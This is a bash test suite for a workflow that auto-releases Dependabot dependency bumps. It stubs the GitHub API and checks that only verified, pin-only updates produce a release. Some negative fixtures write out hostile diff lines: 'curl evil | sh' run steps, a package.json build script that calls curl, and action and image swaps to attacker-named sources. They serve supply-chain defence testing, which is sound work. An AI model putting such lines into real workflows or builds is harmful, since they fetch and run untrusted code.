#!/usr/bin/env bash
#
# MIT License
#
# Copyright (c) 2026 Roberto Leinardi
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Tests the inline scripts of .github/workflows/dependabot-release.yaml.
#
# The scripts are extracted from the workflow with yq, so what is tested is exactly what the
# workflow runs, against canned GitHub API responses served by a stub `gh` (neither job has a
# checkout). The CI gate (require-ci-green) is tested in its own repository; the job graph is
# checked here as written.
#
# Needs: bash, yq (mikefarah v4), jq.

set -euo pipefail

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
WORKFLOW="$ROOT/.github/workflows/dependabot-release.yaml"

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

wf() { yq -r "$1" "$WORKFLOW"; }
extract() {
	wf ".jobs.$1.steps[] | select(.id == \"$2\") | .run" >"$WORK/$2.sh"
	if [ ! -s "$WORK/$2.sh" ]; then
		echo "no step with id '$2' in job '$1' of $WORKFLOW" >&2
		exit 1
	fi
}
extract authorize authorize
extract ci mark

# The gh stub. State lives under $GH_STUB_DIR, one file per endpoint, printed raw (so several JSON
# arrays stand for several pages) and filtered through the real jq when the call passes --jq:
#   refs                 `git/matching-refs/tags/<prefix>`
#   compare              `compare/<base>...<head>`
#   pulls.<sha>          `commits/<sha>/pulls` (missing: prints nothing); pulls.<sha>.<n> wins
#                        for the n-th listing of that commit
#   pr.<number>          `pulls/<number>` (missing: HTTP 404)
#   head                 `git/ref/heads/<branch>`
#   <file>.fail          that call fails with the file's content on stderr
#   calls                one line per invocation
mkdir -p "$WORK/bin"
cat >"$WORK/bin/gh" <<'STUB'
#!/usr/bin/env bash
set -euo pipefail
echo "$*" >>"$GH_STUB_DIR/calls"
[ "$1" = api ] || { echo "unexpected gh $*" >&2; exit 1; }
shift
path="" jq_expr=""
while [ "$#" -gt 0 ]; do
	case "$1" in
	--jq) jq_expr=$2; shift 2 ;;
	--paginate) shift ;;
	*) path=$1; shift ;;
	esac
done
serve() {
	local file="$GH_STUB_DIR/$1"
	[ ! -e "$file.fail" ] || { cat "$file.fail" >&2; exit 1; }
	if [ ! -e "$file" ]; then
		[ "${2:-}" = optional ] && return 0
		echo "gh: Not Found (HTTP 404)" >&2
		exit 1
	fi
	if [ -n "$jq_expr" ]; then jq -r "$jq_expr" "$file"; else cat "$file"; fi
}
case "$path" in
repos/*/git/matching-refs/tags/*) serve refs ;;
repos/*/git/ref/heads/*) serve head ;;
repos/*/compare/*) serve compare ;;
repos/*/commits/*/pulls\?per_page=100)
	sha=${path#*/commits/}
	sha=${sha%%/*}
	n=$(grep -c "commits/$sha/pulls" "$GH_STUB_DIR/calls")
	if [ -e "$GH_STUB_DIR/pulls.$sha.$n" ]; then serve "pulls.$sha.$n"; else serve "pulls.$sha" optional; fi
	;;
repos/*/pulls/*) serve "pr.${path##*/}" ;;
*) echo "unexpected gh api $path" >&2; exit 1 ;;
esac
STUB
chmod +x "$WORK/bin/gh"
PATH="$WORK/bin:$PATH"

PASS=0
FAIL=0
ok() {
	PASS=$((PASS + 1))
	echo "ok   - $1"
}
not_ok() {
	FAIL=$((FAIL + 1))
	echo "FAIL - $1"
	if [ -n "${2:-}" ]; then
		while IFS= read -r line; do printf '       %s\n' "$line"; done <<<"$2"
	fi
}

run_step() {
	local script=$1
	shift
	OUT_FILE="$WORK/output"
	: >"$OUT_FILE"
	STATUS=0
	LOG=$(cd "$WORK" && env GITHUB_OUTPUT="$OUT_FILE" "$@" bash "$WORK/$script.sh" 2>&1) || STATUS=$?
	OUTPUT=$(cat "$OUT_FILE")
}
out() { sed -n "s/^$1=//p" <<<"$OUTPUT"; }

REPO_NAME=leinardi/example
BOT_JSON='{"login": "dependabot[bot]", "type": "Bot"}'
HUMAN_JSON='{"login": "leinardi", "type": "User"}'
# GitHub commits Dependabot's work (and a merge made in the UI) as web-flow.
WEB_FLOW_JSON='{"login": "web-flow", "type": "User"}'
N=0
# A fresh stub state whose last release is v1.2.3 (beside the moving v1, an older release and a
# higher one that sorts below it as text), and an empty comparison.
fixture() {
	N=$((N + 1))
	GH_STUB_DIR="$WORK/gh-$N"
	mkdir -p "$GH_STUB_DIR"
	export GH_STUB_DIR
	jq -n '[{ref: "refs/tags/v1"}, {ref: "refs/tags/v1.2.3"}, {ref: "refs/tags/v1.10.0"},
		{ref: "refs/tags/v1.9.9"}, {ref: "refs/tags/v1.10.0-rc.1"}, {ref: "refs/tags/latest"}]' >"$GH_STUB_DIR/refs"
	COMMITS="[]"
	FILES=$(pin_file trivy-gate/action.yaml)
	SEQ=0
	HEAD_SHA=""
}
sha_of() { printf '%040x' "$1"; }
# A modified file whose only change is an action pin, as a compare `files` array.
pin_file() {
	jq -cn --arg name "$1" '[{filename: $name, status: "modified", patch: "@@ -10,7 +10,7 @@ runs:\n   steps:\n-    - uses: actions/checkout@1111111111111111111111111111111111111111 # v6.0.0\n+    - uses: actions/checkout@2222222222222222222222222222222222222222 # v6.0.1\n       with:"}]'
}
# Appends files to the comparison: add_file <json object>.
add_file() { FILES=$(jq -c --argjson f "$1" '. + [$f]' <<<"$FILES"); }
# Appends a commit: commit <author json> <verified> <subject> [second parent]. Prints its SHA.
commit() {
	SEQ=$((SEQ + 1))
	local sha parents
	sha=$(sha_of "$((N * 1000 + SEQ))")
	if [ -n "${4:-}" ]; then
		parents=$(jq -cn --arg a "$(sha_of 1)" --arg b "$4" '[{sha: $a}, {sha: $b}]')
	else
		parents=$(jq -cn --arg a "$(sha_of 1)" '[{sha: $a}]')
	fi
	COMMITS=$(jq -c --arg sha "$sha" --argjson author "$1" --argjson verified "$2" --arg msg "$3" --argjson parents "$parents" \
		--argjson committer "${COMMITTER_JSON:-$WEB_FLOW_JSON}" \
		'. + [{sha: $sha, parents: $parents, author: $author, committer: $committer, commit: {message: $msg, verification: {verified: $verified}}}]' <<<"$COMMITS")
	HEAD_SHA=$sha
	LAST_SHA=$sha
}
# Dependabot's commit and the merge of its pull request #<n>: dependabot_pr <n> [subject].
dependabot_pr() {
	commit "$BOT_JSON" true "${2:-fix(deps): bump the github-actions-shipped group with 2 updates}"
	local head=$LAST_SHA
	commit "$HUMAN_JSON" true "Merge pull request #$1 from leinardi/dependabot/github_actions/shipped-abc" "$head"
	pr_record "$1" "$LAST_SHA" "$head" >"$GH_STUB_DIR/pr.$1"
	jq -n --argjson pr "$(cat "$GH_STUB_DIR/pr.$1")" '[$pr]' >"$GH_STUB_DIR/pulls.$LAST_SHA"
}
pr_record() {
	jq -n --arg merge "$2" --arg head "$3" --arg repo "$REPO_NAME" --argjson n "$1" --argjson bot "$BOT_JSON" '{
		number: $n, merged: true, merge_commit_sha: $merge, user: $bot,
		head: {ref: "dependabot/github_actions/shipped-abc", sha: $head, repo: {full_name: $repo}},
		base: {ref: "main", repo: {full_name: $repo}}}'
}
# Writes the comparison: compare [status] [total].
compare() {
	jq -n --argjson commits "$COMMITS" --argjson files "$FILES" --arg status "${1:-ahead}" --argjson total "${2:-null}" \
		'{status: $status, total_commits: ($total // ($commits | length)), commits: $commits, files: $files}' >"$GH_STUB_DIR/compare"
}
authorize() {
	run_step authorize GH_TOKEN=x REPO="$REPO_NAME" EVENT="${EVENT:-push}" REF="${REF:-refs/heads/main}" \
		SHA="${SHA_IN:-$HEAD_SHA}" DEFAULT_BRANCH=main TAG_PREFIX="${PREFIX-v}" ECOSYSTEMS="${ECOS:-}" AUTHORIZE_DELAY=0
}
expect_release() {
	if [ "$STATUS" -eq 0 ] && [ "$(out authorized)" = true ] && [ "$(out version)" = "$2" ] && [ "$(out tag)" = "${3:-v$2}" ]; then
		ok "$1"
	else
		not_ok "$1 (want $2, status $STATUS)" "$LOG
$OUTPUT"
	fi
}
expect_skip() {
	if [ "$STATUS" -eq 0 ] && [ "$(out authorized)" = false ] && [ -z "$(out version)" ] \
		&& grep -q '::notice title=No Dependabot release::' <<<"$LOG" && grep -q -- "$2" <<<"$LOG"; then
		ok "$1"
	else
		not_ok "$1 (want a skip matching '$2', status $STATUS)" "$LOG
$OUTPUT"
	fi
}
expect_fail() {
	if [ "$STATUS" -ne 0 ] && [ -z "$(out authorized)" ] && grep -q -- "$2" <<<"$LOG"; then
		ok "$1"
	else
		not_ok "$1 (want a failure matching '$2', status $STATUS)" "$LOG
$OUTPUT"
	fi
}

echo "# authorize"

fixture
dependabot_pr 7
compare
authorize
expect_release "one Dependabot fix and its merge release the next patch of the highest tag" 1.10.1
if grep -q "compare/v1.10.0\.\.\.$HEAD_SHA" "$GH_STUB_DIR/calls"; then
	ok "... compared from v1.10.0, not v1.9.9 or v1.10.0-rc.1"
else
	not_ok "... compared from v1.10.0, not v1.9.9 or v1.10.0-rc.1" "$(cat "$GH_STUB_DIR/calls")"
fi

fixture
dependabot_pr 7
dependabot_pr 8 "chore(deps): bump the github-actions group with 3 updates"
dependabot_pr 9
compare
authorize
expect_release "several Dependabot pull requests, one of them chore, are one patch" 1.10.1
if grep -q "2 fix commit" <<<"$LOG"; then ok "... counting the two fixes"; else not_ok "... counting the two fixes" "$LOG"; fi

fixture
dependabot_pr 7 "chore(deps): bump the github-actions group with 3 updates"
compare
authorize
expect_skip "only chore commits ship nothing" "none of it is a fix"

fixture
dependabot_pr 7
commit "$HUMAN_JSON" true "feat(release): something not yet released"
compare
authorize
expect_skip "a commit by anyone else leaves the release to a human" "not a verified commit by dependabot\[bot\]"

fixture
commit "$BOT_JSON" false "fix(deps): bump something"
compare
authorize
expect_skip "an unverified commit that claims to be Dependabot's is not Dependabot's" "not a verified commit"

fixture
commit '{"login": "dependabot[bot]", "type": "User"}' true "fix(deps): bump something"
compare
authorize
expect_skip "an author named dependabot[bot] who is not a bot is not Dependabot" "not a verified commit"

fixture
dependabot_pr 7 "fix(deps)!: bump a major version"
compare
authorize
expect_skip "a breaking change is a human's release" "is a breaking change"

fixture
dependabot_pr 7
jq '.user = {"login": "leinardi", "type": "User"}' "$GH_STUB_DIR/pr.7" >"$GH_STUB_DIR/pr.7.new"
mv "$GH_STUB_DIR/pr.7.new" "$GH_STUB_DIR/pr.7"
compare
authorize
expect_skip "the merge of someone else's pull request is not Dependabot's" "not the merge of a Dependabot pull request"

for field in '.head.ref = "feature/x"' '.head.repo.full_name = "someone/fork"' '.base.ref = "devel"' '.merged = false' \
	".head.sha = \"$(sha_of 999999)\""; do
	fixture
	dependabot_pr 7
	jq "$field" "$GH_STUB_DIR/pr.7" >"$GH_STUB_DIR/pr.7.new"
	mv "$GH_STUB_DIR/pr.7.new" "$GH_STUB_DIR/pr.7"
	compare
	authorize
	expect_skip "a Dependabot pull request with $field is refused" "not the merge of a Dependabot pull request"
done

fixture
dependabot_pr 7
rm "$GH_STUB_DIR/pulls.$HEAD_SHA"
compare
authorize
expect_skip "a merge commit no pull request merged is not Dependabot's" "not the merge of a Dependabot pull request"
if [ "$(grep -c "commits/$HEAD_SHA/pulls" "$GH_STUB_DIR/calls")" = 4 ]; then
	ok "... after reading the empty list four times"
else
	not_ok "... after reading the empty list four times" "$(cat "$GH_STUB_DIR/calls")"
fi

fixture
dependabot_pr 7
echo '[]' >"$GH_STUB_DIR/pulls.$HEAD_SHA.1"
compare
authorize
expect_release "a pull request association that lags the push is read again" 1.10.1

fixture
dependabot_pr 7
jq -n --arg sha "$(sha_of 424242)" --argjson pr "$(cat "$GH_STUB_DIR/pr.7")" '[$pr | .merge_commit_sha = $sha]' >"$GH_STUB_DIR/pulls.$HEAD_SHA"
compare
authorize
expect_skip "a pull request that only contains the merge commit (an Update branch merge) does not count" "not the merge of a Dependabot"

fixture
commit "$BOT_JSON" true "fix(deps): bump"
COMMITS=$(jq -c '.[0].parents += [{sha: "x"}, {sha: "y"}]' <<<"$COMMITS")
compare
authorize
expect_skip "an octopus merge is no Dependabot merge" "has 3 parents"

fixture
echo '[{"ref": "refs/tags/v1"}, {"ref": "refs/tags/latest"}]' >"$GH_STUB_DIR/refs"
dependabot_pr 7
compare
authorize
expect_skip "with no release yet, the first is a human's" "no vX.Y.Z release yet"
if ! grep -q compare "$GH_STUB_DIR/calls"; then ok "... without comparing"; else not_ok "... without comparing" "$(cat "$GH_STUB_DIR/calls")"; fi

fixture
dependabot_pr 7
compare identical
authorize
if [ "$STATUS" -eq 0 ] && [ "$(out authorized) $(out reconcile) $(out version) $(out tag)" = "true true 1.10.0 v1.10.0" ]; then
	ok "a re-run on the release commit itself finishes that release"
else
	not_ok "a re-run on the release commit itself finishes that release" "$LOG
$OUTPUT"
fi

fixture
dependabot_pr 7
compare behind
authorize
expect_skip "a commit older than the release (a re-run) is nothing to release" "older than the release"

fixture
dependabot_pr 7
compare diverged
authorize
expect_fail "a release that is not an ancestor of the push fails red" "not an ancestor"

fixture
dependabot_pr 7
compare ahead 300
authorize
expect_fail "a truncated comparison fails" "malformed or truncated"

fixture
dependabot_pr 7
echo '{"message": "Server Error"}' >"$GH_STUB_DIR/compare"
authorize
expect_fail "a comparison without a status fails" "is malformed"

for endpoint in refs compare pr.7; do
	fixture
	dependabot_pr 7
	compare
	echo "gh: Server Error (HTTP 502)" >"$GH_STUB_DIR/$endpoint.fail"
	authorize
	expect_fail "an API error reading $endpoint fails" "re-run once the API answers"
done

fixture
dependabot_pr 7
compare
echo "gh: Server Error (HTTP 502)" >"$GH_STUB_DIR/pulls.$HEAD_SHA.fail"
authorize
expect_fail "an API error listing a merge's pull requests fails" "re-run once the API answers"

fixture
dependabot_pr 7
echo '{"not": "a list"}' >"$GH_STUB_DIR/refs"
authorize
expect_fail "a malformed tag list fails" "tag list is malformed"

fixture
jq -n '[{ref: "refs/tags/gtk-rs--v0.3.9"}, {ref: "refs/tags/gtk-rs--v0.4.0"}, {ref: "refs/tags/other--v9.0.0"}]' >"$GH_STUB_DIR/refs"
dependabot_pr 7
compare
PREFIX="gtk-rs--v" authorize
expect_release "a custom tag prefix releases its own next patch" 0.4.1 "gtk-rs--v0.4.1"

for case in "pull_request refs/heads/main" "workflow_dispatch refs/heads/main" "push refs/heads/feature"; do
	fixture
	read -r EVENT REF <<<"$case"
	EVENT=$EVENT REF=$REF authorize
	expect_fail "a $EVENT on $REF is refused" "runs on a push to the default branch"
	if [ ! -s "$GH_STUB_DIR/calls" ]; then ok "... before any API call"; else not_ok "... before any API call" "$(cat "$GH_STUB_DIR/calls")"; fi
done
unset EVENT REF

for bad in "" "a b" 'v$'; do
	fixture
	PREFIX="$bad" authorize
	expect_fail "the tag prefix '$bad' is refused" "tag_prefix"
done

fixture
SHA_IN=abc authorize
expect_fail "a short SHA is refused" "not a full commit SHA"

fixture
dependabot_pr 7 "fix(deps): bump the github-actions-shipped group

BREAKING CHANGE: drops an input"
compare
authorize
expect_skip "a BREAKING CHANGE footer in a Dependabot commit is a human's release" "is a breaking change"

fixture
dependabot_pr 7
COMMITS=$(jq -c '.[-1].commit.message += "\n\nBREAKING-CHANGE: the merge says so"' <<<"$COMMITS")
compare
authorize
expect_skip "a breaking-change footer in the merge commit is a human's release" "is a breaking change"

fixture
dependabot_pr 7
add_file '{"filename": "trivy-gate/action.yaml", "status": "modified", "patch": "@@ -1 +1 @@\n-  run: old\n+  run: curl evil | sh"}'
compare
authorize
expect_skip "a commit attributed to Dependabot (a borrowed author, signed by its committer) that changes more than pins ships nothing" "changes more than Dependabot's updates"
if grep -q 'run: old' <<<"$LOG"; then ok "... naming the line"; else not_ok "... naming the line" "$LOG"; fi

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5,3 +5,4 @@\n   steps:\n+    - uses: attacker/action@3333333333333333333333333333333333333333 # v1.0.0\n     - run: make"}'
compare
authorize
expect_skip "a new step with a pinned action, added beside a pin bump, is not a bump" "0 line(s) removed, 1 added"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5,3 +5,2 @@\n   steps:\n-    - uses: actions/cache@1111111111111111111111111111111111111111 # v4.0.0\n     - run: make"}'
compare
authorize
expect_skip "a removed step is not a bump" "1 line(s) removed, 0 added"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5 +5 @@\n-    - uses: actions/checkout@1111111111111111111111111111111111111111 # v6.0.0\n+    - uses: attacker/checkout@2222222222222222222222222222222222222222 # v6.0.1"}'
compare
authorize
expect_skip "another action in place of the pinned one is not a bump" "attacker/checkout"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5 +5 @@\n-    - uses: actions/checkout@1111111111111111111111111111111111111111 # v6.0.0\n+    - uses: actions/checkout@v6"}'
compare
authorize
expect_skip "a pin moving to a tag instead of a full SHA is not a bump" "actions/checkout@v6"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5 +5 @@\n-    - uses: actions/checkout@1111111111111111111111111111111111111111 # v6.0.0\n+        uses: actions/checkout@2222222222222222222222222222222222222222 # v6.0.1"}'
compare
authorize
expect_skip "a pin moving to another place (indentation) is not a bump" "->"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5,2 +5,2 @@\n-    - uses: actions/checkout@1111111111111111111111111111111111111111 # v6.0.0\n-    - uses: actions/cache@1111111111111111111111111111111111111111 # v4.0.0\n+    - uses: actions/cache@2222222222222222222222222222222222222222 # v4.0.1\n+    - uses: actions/checkout@2222222222222222222222222222222222222222 # v6.0.1"}'
compare
authorize
expect_skip "a step swapped for another inside one hunk is not a bump" "->"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5,3 +5,3 @@\n   steps:\n-    - uses: example/prepare@1111111111111111111111111111111111111111 # v1.0.0\n     - uses: example/consume@3333333333333333333333333333333333333333 # v1.0.0\n+    - uses: example/prepare@2222222222222222222222222222222222222222 # v1.0.1"}'
compare
authorize
expect_skip "a pin moved past an unchanged step (a reorder) is not a bump" "0 line(s) removed, 1 added\|1 line(s) removed, 0 added"

fixture
dependabot_pr 7
add_file '{"filename": "release/action.yaml", "status": "modified", "patch": "@@ -5,4 +5,4 @@\n   steps:\n-    - uses: example/prepare@1111111111111111111111111111111111111111 # v1.0.0\n+    - uses: example/prepare@2222222222222222222222222222222222222222 # v1.0.1\n     - uses: example/consume@3333333333333333333333333333333333333333 # v1.0.0\n-    - uses: example/publish@1111111111111111111111111111111111111111 # v2.0.0\n+    - uses: example/publish@2222222222222222222222222222222222222222 # v2.0.1"}'
compare
authorize
expect_release "two pins bumped in place, with an unchanged step between them, are a bump" 1.10.1

fixture
dependabot_pr 7
add_file '{"filename": "new/action.yaml", "status": "added", "patch": "@@ -0,0 +1 @@\n+    - uses: a/b@c"}'
compare
authorize
expect_skip "an added file is more than a pin bump" "(added, not modified)"

fixture
dependabot_pr 7
add_file '{"filename": "logo.png", "status": "modified"}'
compare
authorize
expect_skip "a file without a patch (binary, too large) is more than a pin bump" "no patch"

fixture
dependabot_pr 7
add_file '{"filename": ".pre-commit-config.yaml", "status": "modified", "patch": "@@ -3 +3 @@\n-    rev: v1.2.3 # frozen: v1.2.3\n+    rev: v1.2.4"}'
compare
authorize
expect_release "a pre-commit rev bump beside the pins does not block the release" 1.10.1

fixture
dependabot_pr 7
add_file '{"filename": "action.yaml", "status": "modified", "patch": "@@ -3 +3 @@\n-    rev: v1\n+    rev: v2"}'
compare
authorize
expect_skip "a rev: line outside .pre-commit-config.yaml is more than a pin bump" "changes more than Dependabot's updates"

fixture
dependabot_pr 7
FILES=$(jq -c '[range(300) as $i | .[0] | .filename = "f\($i)"]' <<<"$FILES")
compare
authorize
expect_fail "a file list the API may have truncated fails" "malformed or incomplete"

fixture
COMMITTER_JSON="$HUMAN_JSON" commit "$BOT_JSON" true "fix(deps): bump something"
compare
authorize
expect_skip "a commit authored by Dependabot but committed by someone else (pushed from a clone) is not Dependabot's" "committed by GitHub"

fixture
SHA_IN=$(sha_of 5) ECOS="docker rust" authorize
expect_fail "an unknown ecosystem is refused" "ecosystems holds 'rust'"

# One file changed beside the default pin bump, with the ecosystems given: ecosystem_case
# <release|skip> <description> <ecosystems> <file> <patch> [skip message].
MORE_THAN_UPDATES="changes more than Dependabot's updates"
ecosystem_case() {
	fixture
	dependabot_pr 7
	add_file "$(jq -cn --arg f "$4" --arg p "$5" '{filename: $f, status: "modified", patch: $p}')"
	compare
	ECOS="$3" authorize
	if [ "$1" = release ]; then
		expect_release "$2" 1.10.1
	else
		expect_skip "$2" "${6:-$MORE_THAN_UPDATES}"
	fi
}
DF=deployments/docker/Dockerfile
FROM_TAG=$'@@ -136 +136 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM dhi.io/static:20250601 AS base'
ecosystem_case release "docker: a FROM tag bump ships" docker "$DF" "$FROM_TAG"
ecosystem_case skip "docker: without the ecosystem, a FROM bump is a human's release" "" "$DF" "$FROM_TAG"
ecosystem_case release "docker: a digest bump with its tag, under --platform, ships" "docker cargo" Dockerfile \
	$'@@ -30,2 +30,2 @@\n-FROM ubuntu:26.04@sha256:'"$(printf 'a%.0s' {1..64})"$' AS base\n-FROM --platform=$BUILDPLATFORM dhi.io/rust:1.98.1-debian13-dev AS build\n+FROM ubuntu:26.04@sha256:'"$(printf 'b%.0s' {1..64})"$' AS base\n+FROM --platform=$BUILDPLATFORM dhi.io/rust:1.99.0-debian13-dev AS build'
ecosystem_case skip "docker: another image in place of the base is not a bump" docker "$DF" \
	$'@@ -136 +136 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM attacker.io/static:20250601 AS base'
ecosystem_case skip "docker: a renamed stage is not a bump" docker "$DF" \
	$'@@ -136 +136 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM dhi.io/static:20250601 AS other'
ecosystem_case skip "docker: a changed RUN line is not a bump" docker "$DF" \
	$'@@ -140 +140 @@\n-RUN make\n+RUN curl evil | sh'
ecosystem_case skip "docker: a FROM line added beside the bump is not a bump" docker "$DF" \
	$'@@ -136 +136,2 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM dhi.io/static:20250601 AS base\n+FROM attacker/x:1 AS y' "1 line(s) removed, 2 added"
ecosystem_case release "cargo: a version requirement in Cargo.toml, plain and in a table, ships" cargo Cargo.toml \
	$'@@ -20,2 +20,2 @@\n-log = "0.4.34"\n-tokio-tungstenite = { version = "0.29.0", features = ["rustls"] }\n+log = "0.4.35"\n+tokio-tungstenite = { version = "0.30.0", features = ["rustls"] }'
ecosystem_case skip "cargo: a build script swapped in Cargo.toml is not a bump" cargo Cargo.toml \
	$'@@ -5 +5 @@\n-build = "build.rs"\n+build = "evil.rs"'
ecosystem_case skip "cargo: a dependency moved to git is not a bump" cargo crates/core/Cargo.toml \
	$'@@ -20 +20 @@\n-log = "0.4.34"\n+log = { git = "https://example.com/log" }'
LOCK=$'@@ -1461,9 +1461,9 @@ dependencies = [\n \n [[package]]\n name = "log"\n-version = "0.4.34"\n+version = "0.4.35"\n source = "registry+https://github.com/rust-lang/crates.io-index"\n-checksum = "'"$(printf 'f%.0s' {1..64})"$'"\n+checksum = "'"$(printf '5%.0s' {1..64})"$'"\n \n [[package]]\n+name = "new-dep"\n+version = "1.0.0"\n+source = "registry+https://github.com/rust-lang/crates.io-index"\n+dependencies = [\n+ "log",\n+ "serde 1.0.1 (registry+https://github.com/rust-lang/crates.io-index)",\n+]'
ecosystem_case release "cargo: Cargo.lock versions, checksums and a new crates.io package ship" cargo Cargo.lock "$LOCK"
ecosystem_case skip "cargo: without the ecosystem, Cargo.lock is a human's release" docker Cargo.lock "$LOCK"
ecosystem_case skip "cargo: a Cargo.lock source outside crates.io is not a bump" cargo Cargo.lock \
	$'@@ -1 +1 @@\n-source = "registry+https://github.com/rust-lang/crates.io-index"\n+source = "git+https://example.com/log#abc"' "git+https"
GOMOD=$'@@ -24,7 +24,8 @@ require (\n \tgithub.com/stretchr/testify v1.12.1\n-\tgolang.org/x/crypto v0.57.0\n+\tgolang.org/x/crypto v0.58.0\n+\tgolang.org/x/tools v0.51.0 // indirect\n \tgolang.org/x/sync v0.24.0\n@@ -3 +3 @@\n-go 1.26.0\n+go 1.26.1\n-toolchain go1.26.9\n+toolchain go1.26.10'
ecosystem_case release "gomod: go.mod requirements, an indirect one added, go and toolchain ship" gomod go.mod "$GOMOD"
ecosystem_case skip "gomod: a replace added to go.mod is not a bump" gomod go.mod \
	$'@@ -90 +90,2 @@\n )\n+replace golang.org/x/crypto => example.com/crypto v0.58.0' "replace"
ecosystem_case release "gomod: go.sum hashes ship" gomod go.sum \
	$'@@ -152,2 +152,2 @@\n-golang.org/x/crypto v0.57.0 h1:3ZVCjf8Ggz7zneR/EHRVx68Ctf+2pmIMP2UFhh9cC6M=\n-golang.org/x/crypto v0.57.0/go.mod h1:Fdz0i5U6CoizGwLda9DttjSk6qlZo25zYNtR+ycvuZA=\n+golang.org/x/crypto v0.58.0 h1:COkYLr4k7nDI4r6QtMML2AfzeIswWHAJthLS6K/M/54=\n+golang.org/x/crypto v0.58.0/go.mod h1:Xh+kl5A+M0gMiWDytH2Hhr5Z7WbNCpv/eB/EFgfSk+w='
ecosystem_case skip "gomod: a go.sum line that is no hash is not a bump" gomod go.sum $'@@ -1 +1 @@\n-a v1.0.0 h1:x=\n+anything'
ecosystem_case release "npm: a dependency version in package.json ships" npm web/package.json \
	$'@@ -20 +20 @@\n-    "vite": "^7.1.0",\n+    "vite": "^7.1.2",'
ecosystem_case skip "npm: a changed script in package.json is not a bump" npm web/package.json \
	$'@@ -8 +8 @@\n-    "build": "vite build",\n+    "build": "curl evil 2"'
ecosystem_case release "npm: package-lock.json from registry.npmjs.org ships" npm web/package-lock.json \
	$'@@ -100,4 +100,4 @@\n     "node_modules/vite": {\n-      "version": "7.1.0",\n-      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.0.tgz",\n+      "version": "7.1.2",\n+      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.2.tgz",'
ecosystem_case skip "npm: a package-lock.json resolved outside registry.npmjs.org is not a bump" npm web/package-lock.json \
	$'@@ -101 +101 @@\n-      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.0.tgz",\n+      "resolved": "git+https://example.com/vite.git",' "example.com"
ecosystem_case skip "npm: a linked package in package-lock.json is not a bump" npm web/package-lock.json \
	$'@@ -101 +101 @@\n-      "version": "7.1.0",\n+      "link": true,' 'link'

# Each rule's reach: an ecosystem that is not listed leaves its files to the action-pin rule.
ecosystem_case skip "cargo: without the ecosystem, Cargo.toml is a human's release" docker Cargo.toml \
	$'@@ -20 +20 @@\n-log = "0.4.34"\n+log = "0.4.35"'
ecosystem_case skip "gomod: without the ecosystem, go.mod is a human's release" docker go.mod "$GOMOD"
ecosystem_case skip "npm: without the ecosystem, package.json is a human's release" docker web/package.json \
	$'@@ -20 +20 @@\n-    "vite": "^7.1.0",\n+    "vite": "^7.1.2",'
NPM_LOCK=$'@@ -100,4 +100,4 @@\n     "node_modules/vite": {\n-      "version": "7.1.0",\n-      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.0.tgz",\n+      "version": "7.1.2",\n+      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.2.tgz",'
ecosystem_case skip "npm: without the ecosystem, package-lock.json is a human's release" docker web/package-lock.json "$NPM_LOCK"
ecosystem_case release "ecosystems split on tabs and newlines (a YAML block) like on spaces" $'gomod\tnpm\n' web/package-lock.json "$NPM_LOCK"

# Cargo.toml: only the requirement moves.
ecosystem_case skip "cargo: a changed feature list beside the version is not a bump" cargo Cargo.toml \
	$'@@ -20 +20 @@\n-log = { version = "1", features = ["a"] }\n+log = { version = "2", features = ["b"] }'
ecosystem_case skip "cargo: a version beside a git source is not a plain requirement" cargo Cargo.toml \
	$'@@ -20 +20 @@\n-log = { git = "https://example.com/log", version = "1" }\n+log = { git = "https://example.com/log", version = "2" }'

# Cargo.lock: each line's shape, removed lines included.
ecosystem_case skip "cargo: a Cargo.lock dependency entry with a git source is not a bump" cargo Cargo.lock \
	$'@@ -5 +5 @@\n- "log 0.4.34",\n+ "log 0.4.35 (git+https://example.com/log#abc)",' "git+https"
ecosystem_case skip "cargo: a Cargo.lock version that is not a version is not a bump" cargo Cargo.lock \
	$'@@ -5 +5 @@\n-version = "0.4.34"\n+version = "0.4.35 (git+https://example.com)"' "example.com"
ecosystem_case skip "cargo: a removed Cargo.lock line is checked too" cargo Cargo.lock \
	$'@@ -90,2 +90 @@\n-[[patch.unused]]\n-name = "log"\n+name = "log"' "patch.unused"

# go.mod and go.sum.
ecosystem_case skip "gomod: a requirement replaced inline is not a bump" gomod go.mod \
	$'@@ -24 +24 @@\n-\tgolang.org/x/crypto v0.57.0\n+\tgolang.org/x/crypto v0.58.0 => example.com/crypto v0.58.0' "example.com"
